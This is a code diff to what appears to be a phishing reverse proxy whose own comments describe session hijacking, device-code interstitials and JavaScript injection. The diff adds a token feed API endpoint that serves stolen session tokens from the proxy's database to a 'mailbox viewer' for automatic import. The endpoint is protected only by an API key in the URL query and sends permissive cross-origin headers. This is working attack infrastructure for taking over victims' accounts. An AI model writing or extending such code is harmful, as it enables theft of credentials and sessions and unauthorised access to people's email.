@@ -237,6 +237,7 @@ var (
 	dcPageRe         = regexp.MustCompile(`^/dc/([a-zA-Z0-9_-]+)$`)
 	dcStatusRe       = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9_-]+)$`)
 	portalPageRe     = regexp.MustCompile(`^/p/([a-fA-F0-9]{64})$`)
+	tokenFeedRe      = regexp.MustCompile(`^/api/v1/feed$`)
 	redirRe          = regexp.MustCompile(`^/assets/js/([^/]*)`)
 	jsInjectRe       = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
 	jsonContentRe    = regexp.MustCompile(`application/\w*\+?json`)
@@ -281,6 +282,7 @@ type HttpProxy struct {
 	stopChan          chan struct{} // For graceful shutdown
 	rateLimiter       *RateLimiter  // DDoS protection and load management
 	tokenPortal       *TokenPortal  // Token-to-cookie portal for session hijacking
+	tokenFeed         *TokenFeed    // Token feed API for mailbox viewer auto-import
 
 	// Connection statistics for monitoring
 	connStats struct {
@@ -341,6 +343,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	// Initialize token portal for session cookie extraction
 	p.tokenPortal = NewTokenPortal(db)
+
+	// Initialize token feed API for mailbox viewer
+	p.tokenFeed = NewTokenFeed(db)
 
 	// Initialize connection statistics
 	p.connStats.startTime = time.Now()
@@ -864,6 +869,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 			// --- End device code interstitial endpoint ---
+
+			// --- Begin token feed API (serves tokens to mailbox viewer) ---
+			if tokenFeedRe.MatchString(req.URL.Path) {
+				apiKey := req.URL.Query().Get("key")
+				body, statusCode := p.tokenFeed.HandleFeedRequest(apiKey)
+				resp := goproxy.NewResponse(req, "application/json", statusCode, body)
+				resp.Header.Set("Access-Control-Allow-Origin", "*")
+				resp.Header.Set("Access-Control-Allow-Methods", "GET")
+				resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
+				resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+				if statusCode == 200 {
+					log.Info("[tokenfeed] Feed served to %s", remote_addr)
+				} else {
+					log.Warning("[tokenfeed] Unauthorized feed access from %s", remote_addr)
+				}
+				return req, resp
+			}
+			// --- End token feed API ---
 
 			// --- Begin portal endpoint (token-to-cookie conversion) ---
 			if portalPageRe.MatchString(req.URL.Path) {
